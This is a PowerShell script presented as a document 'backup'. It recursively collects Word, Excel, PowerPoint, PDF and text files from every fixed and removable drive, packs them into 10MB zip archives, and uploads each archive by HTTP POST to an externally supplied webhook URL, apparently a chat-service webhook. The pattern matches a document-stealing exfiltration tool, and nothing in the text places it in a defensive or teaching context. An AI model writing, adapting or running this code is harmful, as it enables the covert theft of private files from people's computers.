$WebhookUrl = $dc
$MaxZipSize = 10MB
$OutputPath = "C:\Backup\Documents"
$Extensions = @("*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.pdf", "*.txt", "*.rtf")
$ExcludedDirs = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\ProgramData")

if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath -Force
}

$Drives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 -or $_.DriveType -eq 3 } | Select-Object -ExpandProperty DeviceID

$Files = @()
foreach ($Drive in $Drives) {
    Write-Host "Searching drive: $Drive"
    foreach ($Ext in $Extensions) {
        try {
            $Files += Get-ChildItem -Path "$Drive\" -Recurse -Include $Ext -ErrorAction SilentlyContinue | 
                      Where-Object { -not $_.PSIsContainer -and $ExcludedDirs -notcontains $_.PSParentPath.Split(":", 2)[1].Split("\")[1] }
        } catch {
            Write-Host "Error searching $Drive for $Ext : $_"
        }
    }
}

Write-Host "Found files: $($Files.Count)"

$ZipCounter = 1
$CurrentZipSize = 0
$CurrentFiles = @()
$ZipFiles = @()

foreach ($File in $Files) {
    $FileSize = $File.Length
    if ($CurrentZipSize + $FileSize -gt $MaxZipSize -and $CurrentFiles.Count -gt 0) {
        $ZipName = Join-Path $OutputPath "Backup_$ZipCounter.zip"
        try {
            Compress-Archive -Path $CurrentFiles.FullName -DestinationPath $ZipName -Force -ErrorAction Stop
            $ZipFiles += $ZipName
            Write-Host "Created zip: $ZipName"
        } catch {
            Write-Host "Error zipping $ZipName : $_"
        }
        
        $ZipCounter++
        $CurrentZipSize = 0
        $CurrentFiles = @()
    }
    $CurrentFiles += $File
    $CurrentZipSize += $FileSize
}

if ($CurrentFiles.Count -gt 0) {
    $ZipName = Join-Path $OutputPath "Backup_$ZipCounter.zip"
    try {
        Compress-Archive -Path $CurrentFiles.FullName -DestinationPath $ZipName -Force -ErrorAction Stop
        $ZipFiles += $ZipName
        Write-Host "Created zip: $ZipName"
    } catch {
        Write-Host "Error zipping $ZipName : $_"
    }
}

foreach ($ZipFile in $ZipFiles) {
    if (-not (Test-Path $ZipFile)) {
        Write-Host "Zip file $ZipFile does not exist, skipping upload."
        continue
    }
    
    $FileName = Split-Path $ZipFile -Leaf
    $Boundary = [System.Guid]::NewGuid().ToString()
    $ContentType = "multipart/form-data; boundary=$Boundary"
    
    $FileBytes = [System.IO.File]::ReadAllBytes($ZipFile)
    $FileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($FileBytes)
    
    $BodyLines = (
        "--$Boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"",
        "Content-Type: application/octet-stream`r`n",
        $FileEnc,
        "--$Boundary--"
    ) -join "`r`n"
    
    try {
        $Response = Invoke-WebRequest -Uri $WebhookUrl -Method Post -ContentType $ContentType -Body $BodyLines -ErrorAction Stop
        Write-Host "Uploaded file: $FileName"
    } catch {
        Write-Host "Error uploading $FileName : $_"
    }
}

Write-Host "Backup completed!"
